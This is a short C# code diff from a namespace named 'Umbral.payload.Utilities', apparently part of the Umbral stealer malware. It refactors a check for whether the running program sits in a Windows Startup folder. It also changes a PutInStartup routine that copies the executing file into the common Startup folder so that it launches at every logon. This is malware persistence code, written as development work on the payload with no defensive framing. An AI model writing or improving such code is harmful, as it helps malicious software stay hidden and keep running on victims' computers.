@@ -3,7 +3,6 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.IO.Compression;
-using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Reflection;
@@ -36,15 +35,14 @@ namespace Umbral.payload.Utilities
         {
             try
             {
-                string currentPath = Assembly.GetCallingAssembly().Location;
-                string directoryPath = Path.GetDirectoryName(currentPath);
-                string[] startupPath =
+                string currentPath = Assembly.GetExecutingAssembly().Location;
+                string currentDirectoryPath = Path.GetDirectoryName(currentPath);
+                string[] startupPaths =
                 {
                     Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
                     Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                 };
-
-                return startupPath.Contains(directoryPath);
+                return Array.Exists(startupPaths, e => e.Equals(currentDirectoryPath, StringComparison.OrdinalIgnoreCase));
             }
             catch
             {
@@ -65,7 +63,7 @@ namespace Umbral.payload.Utilities
             return result.ToString();
         }
 
-        internal static bool PutInStartup()
+        internal static void PutInStartup()
         {
             string currentPath = Assembly.GetExecutingAssembly().Location;
             string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
@@ -74,11 +72,10 @@ namespace Umbral.payload.Utilities
             try
             {
                 File.Copy(currentPath, newFilePath, true);
-                return true;
             }
-            catch
+            catch (Exception e)
             {
-                return false;
+                Console.WriteLine(e);
             }
         }
 
